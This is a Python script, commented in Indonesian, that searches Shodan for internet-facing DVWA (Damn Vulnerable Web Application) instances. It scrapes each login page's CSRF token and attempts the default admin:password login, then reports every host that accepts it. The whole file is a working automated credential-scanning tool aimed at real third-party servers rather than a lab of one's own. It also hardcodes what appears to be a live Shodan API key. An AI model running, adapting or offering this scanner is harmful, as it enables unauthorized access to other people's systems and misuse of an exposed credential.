import shodan
import time
import requests
import re

# Kunci API Shodan Anda
Shodan_API_Key = "xeGycQNQ4uUl8UUlMKBYUM7199EqSHOs"
api = shodan.Shodan(Shodan_API_Key)

# Fungsi untuk mengirim permintaan pencarian ke Shodan API
def request_page_from_shodan(query, page=1):
    while True:
        try:
            instances = api.search(query, page=page)
            return instances
        except shodan.APIError as e:
            print(f"Error {e}")
            time.sleep(5)

# Fungsi untuk mencoba kredensial default pada instance DVWA, mensimulasikan pengguna nyata yang mencoba kredensial
# Mengunjungi halaman login.php untuk mendapatkan token CSRF, dan mencoba login dengan admin:password
def has_valid_credentials(instance):
    sess = requests.Session()
    proto = ("ssl" in instance) and "https" or "http"
    try:
        res = sess.get(f"{proto}://{instance['ip_str']}:{instance['port']}/login.php", verify=False)
    except requests.exceptions.ConnectionError:
        return False
    if res.status_code != 200:
        print(f"[-] Mendapatkan Kode Status HTTP {res.status_code}")
        return False
    # Cari token CSRF menggunakan Regex
    token = re.search(r"user_token' value='([0-9a-f]+)'", res.text).group(1)
    res = sess.post(
        f"{proto}://{instance['ip_str']}:{instance['port']}/login.php",
        f"username=admin&password=password&user_token={token}&Login=Login",
        allow_redirects=False,
        verify=False,
        headers={"Content-Type":"application/x-www-form-urlencoded"}
    )
    if res.status_code == 302 and res.headers["Location"] == "index.php":
        # Redirect ke index.php, diharapkan berhasil otentikasi
        return True
    else:
        return False

# Fungsi untuk memproses halaman hasil pencarian
def process_page(page):
    result = []
    for instance in page["matches"]:
        if has_valid_credentials(instance):
            print(f"[+] Kredensial Valid di : {instance['ip_str']}:{instance['port']}")
            result.append(instance)
    return result

# Fungsi untuk melakukan pencarian DVWA menggunakan Shodan API
def query_shodan(query):
    print("[*] Melakukan kueri pada halaman pertama")
    first_page = request_page_from_shodan(query)
    total = first_page["total"]
    already_processed = len(first_page["matches"])
    result = process_page(first_page)
    page = 2
    while already_processed < total:
        # Hentikan hanya pada pengujian, kueri API memiliki batasan bulanan
        break
        print(f"Melakukan kueri pada halaman {page}")
        page = request_page_from_shodan(query, page)
        already_processed += len(page['matches'])
        result += process_page(page)
        page += 1
    return result

# Pencarian instance DVWA
res = query_shodan(f"title:dvwa")
print(res)
